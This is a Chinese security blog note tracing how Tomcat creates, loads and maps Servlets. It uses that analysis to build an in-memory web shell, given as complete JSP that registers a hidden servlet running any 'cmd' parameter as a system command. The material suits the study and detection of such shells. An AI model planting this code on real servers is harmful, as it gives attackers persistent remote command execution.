---
created: '22/02/16'
title: Tomcat-Servlet型内存马
tags:
  - java
  - java安全
  - 内存马
---
# Tomcat-Servlet型内存马

## 参考文章
- https://blog.csdn.net/angry_program/article/details/118492214
- https://www.jianshu.com/p/ed74f6e1cbdb

## Tomcat与Servlet
要想了解如何动态注册Servlet，我们需要对tomcat有一个更好的认识:
> Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，它早期的名称为catalina，后来由Apache、Sun 和其他一些公司及个人共同开发而成，并更名为Tomcat。Tomcat 是一个小型的轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选，因为Tomcat 技术先进、性能稳定，成为目前比较流行的Web 应用服务器。Tomcat是应用（java）服务器，它只是一个servlet容器，是Apache的扩展，但它是独立运行的。


Tomcat由四大容器组成，分别是Engine、Host、Context、Wrapper。这四个组件是负责关系，存在包含关系。只包含一个引擎（Engine）：
> Engine（引擎）：表示可运行的Catalina的servlet引擎实例，并且包含了servlet容器的核心功能。在一个服务中只能有一个引擎。同时，作为一个真正的容器，Engine元素之下可以包含一个或多个虚拟主机。它主要功能是将传入请求委托给适当的虚拟主机处理。如果根据名称没有找到可处理的虚拟主机，那么将根据默认的Host来判断该由哪个虚拟主机处理。
> 
> Host （虚拟主机）：作用就是运行多个应用，它负责安装和展开这些应用，并且标识这个应用以便能够区分它们。它的子容器通常是 Context。一个虚拟主机下都可以部署一个或者多个Web App，每个Web App对应于一个Context，当Host获得一个请求时，将把该请求匹配到某个Context上，然后把该请求交给该Context来处理。主机组件类似于Apache中的虚拟主机，但在Tomcat中只支持基于FQDN(完全合格的主机名)的“虚拟主机”。Host主要用来解析web.xml
> 
> Context（上下文）：代表 Servlet 的 Context，它具备了 Servlet 运行的基本环境，它表示Web应用程序本身。Context 最重要的功能就是管理它里面的 Servlet 实例，一个Context代表一个Web应用，一个Web应用由一个或者多个Servlet实例组成。
> 
> Wrapper（包装器）：代表一个 Servlet，它负责管理一个 Servlet，包括的 Servlet 的装载、初始化、执行以及资源回收。Wrapper 是最底层的容器，它没有子容器了，所以调用它的 addChild 将会报错。 

![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217164552.png)

其中webapps文件夹即是我们的Host，webapps中的文件夹(如examples/ROOT)代表一个Context，每个Context内包含Wrapper，Wrapper 则负责管理容器内的 Servlet。

实际上，在Tomcat7之后的版本，StandardContext中提供了动态注册Servlet的方法，但是并未实现:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217164912.png)

所以我们需要自己去实现动态添加Servlet的功能，在此之前我们需要了解Servlet的生命周期(主要关注初始化和装载)。

## Servlet初始化流程分析
在`org.apache.catalina.core.StandardWrapper#setServletClass()`处下断点调试，回溯到上一层的`ContextConfig.configureConetxt()`:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217165809.png)
在这里我们可以很清楚地看到Wrapper的初始化流程，首先调用创建了wrapper，然后调用set方法配置wrapper相关的属性，我们可以参考web.xml中需要配置的属性来推测wrapper的关键属性(即图中红框)，需要留意的一个特殊属性是load-on-startup属性，它是一个启动优先级，后续再分析:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217170042.png)
接着继续配置wrapper的servletClass:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217170428.png)
配置完成之后会将wrapper放入StandardContext的child里:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217170635.png)
接着会遍历web.xml中servlet-mapping的servlet-name和对应的url-pattern，调用`StandardContext.addServletMappingDecoded()`添加servlet对应的映射:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217170953.png)

总结一下，Servlet的初始化一共有几个步骤:
1. 通过 context.createWapper() 创建 Wapper 对象
2. 设置 Servlet 的 LoadOnStartUp 的值(后续分析为什么动态注册Servlet需要设置该属性)
3. 设置 Servlet 的 Name
4. 设置 Servlet 对应的 Class
5. 将 Servlet 添加到 context 的 children 中
6. 将 url 路径和 servlet 类做映射

## Servlet装载流程分析
在` org.apache.catalina.core.StandardWapper#loadServlet()`处下断点调试，回溯到`StandardContext.startInternal()`方法:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217171608.png)
可以看到，是在加载完Listener和Filter之后，才装载Servlet:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217171746.png)
这里调用了`findChildren()`方法从StandardContext中拿到所有的child并传到`loadOnStartUp()`方法处理，跟到`loadOnstartup()`，可以根据代码和注释了解到这个方法会将所有load-on-startup属性大于0的wrapper加载(反之则不会)，这也是为什么上文我们提到需要关注这个属性的原因:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217172024.png)
根据搜索，我们了解到load-on-startup属性的作用:
> load-on-startup 这个元素的含义是在服务器启动的时候就加载这个servlet(实例化并调用init()方法). 这个元素中的可选内容必须为一个整数,表明了这个servlet被加载的先后顺序. 当是一个负数时或者没有指定时，则表示服务器在该servlet被调用时才加载。

可以看到当未设置load-on-startup属性是，tomcat采用的是一种懒加载的机制，只有servlet被调用时才会加载到Context中。

由于我们需要动态注册Servlet，为了使其被加载，我们必须设置load-on-startup属性。

## 内存马实现流程分析
根据上述的流程分析，我们可以模仿上述的加载机制手动注册一个servlet:
1. 找到StandardContext
2. 继承并编写一个恶意servlet
3. 通过 context.createWapper() 创建 Wapper 对象
2. 设置 Servlet 的 LoadOnStartUp 的值
3. 设置 Servlet 的 Name
4. 设置 Servlet 对应的 Class
5. 将 Servlet 添加到 context 的 children 中
6. 将 url 路径和 servlet 类做映射

以下是代码的具体实现:
```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.annotation.WebServlet" %>
<%@ page import="javax.servlet.http.HttpServlet" %>
<%@ page import="javax.servlet.http.HttpServletRequest" %>
<%@ page import="javax.servlet.http.HttpServletResponse" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.catalina.connector.Request" %>

<%
    class S implements Servlet{

        @Override
        public void init(ServletConfig config) throws ServletException {

        }

        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            if(cmd != null){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {}
            }
        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {

        }
    }
%>

<%
    // ServletContext servletContext =  request.getServletContext();
    // Field appctx = servletContext.getClass().getDeclaredField("context");
    // appctx.setAccessible(true);
    // ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    // Field stdctx = applicationContext.getClass().getDeclaredField("context");
    // stdctx.setAccessible(true);
    // StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    // 更简单的方法 获取StandardContext
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();

    S servlet = new S();
    String name = servlet.getClass().getSimpleName();
    Wrapper newWrapper = standardContext.createWrapper();
    newWrapper.setName(name);
    newWrapper.setLoadOnStartup(1);
    newWrapper.setServlet(servlet);
    newWrapper.setServletClass(servlet.getClass().getName());
    standardContext.addChild(newWrapper);
    standardContext.addServletMappingDecoded("/longlone", name);
    
    out.println("inject success");
%>
```

## 优缺点分析
缺点:
- 这种类型的内存马需要访问具体路径才能够命令执行，日志中比较容易被发现


优点:
- 兼容性强，兼容tomcat7
